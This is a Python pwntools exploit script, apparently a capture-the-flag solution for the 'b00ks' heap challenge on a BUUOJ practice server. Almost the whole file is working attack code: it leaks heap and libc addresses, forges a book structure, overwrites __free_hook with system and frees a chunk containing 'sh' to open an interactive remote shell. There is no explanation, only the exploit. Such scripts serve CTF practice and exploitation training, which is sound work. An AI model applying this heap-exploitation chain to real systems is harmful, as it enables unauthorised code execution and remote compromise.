# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from LibcSearcher import LibcSearcher
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './b00ks'
elf = ELF(binary)
#libc = elf.libc
libc = ELF('./libc/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26178'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda a          : p.recv(a)
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

def add(name_size,name,text_size,text):
    cmd(1)
    sla("name size:",name_size)
    sa("rs):",name)
    sla("tion name:",text_size)
    sa("Enter book description:",text)

def edit(idx,text):
    cmd(3)
    sla("to edit:",idx)
    sla("description",text)

def show():
    cmd(4)

def delete(idx):
    cmd(2)
    sla("delete:",idx)

def rename(text ="niyah".rjust(0x20,"a") ):
    sla("name:",text)

rename()

add(0x80,"book\n",0x70,"niyah\n")

show()
ru("aaniyah")
heap_addr =  u64(rl(6).ljust(8,"\x00"))
lg("heap_addr",heap_addr)

add(0x80,"book\n",0x60,"niyah\n")
add(0x80,"book\n",0x60,"niyah\n")
add(0x80,"sh\x00\n",0x60,"sh\x00\n")

payload = p64(1) + p64(heap_addr + 0x30) + p64(heap_addr+0x90 + 0x70 +0x30+ 0x90 + 0x70+0x30) + p64(0x20)

edit(1,"a"*0x50 + payload)

delete(2)
cmd(5)
rename()

show()

__malloc_hook = l64() - 0x68

lg("__malloc_hook",__malloc_hook)

libc.address = __malloc_hook - libc.sym["__malloc_hook"]
system = libc.sym["system"]
free_hook = libc.sym["__free_hook"]

lg("free_hook",free_hook)
lg("system",system)

payload = p64(3) + p64(0) + p64(free_hook) + p64(0x8)

edit(1, payload)

edit(3,p64(system))

delete(4)

#dbg()



p.interactive()

'''
@File    :   b00ks.py
@Time    :   2021/07/17 14:59:34
@Author  :   Niyah 
'''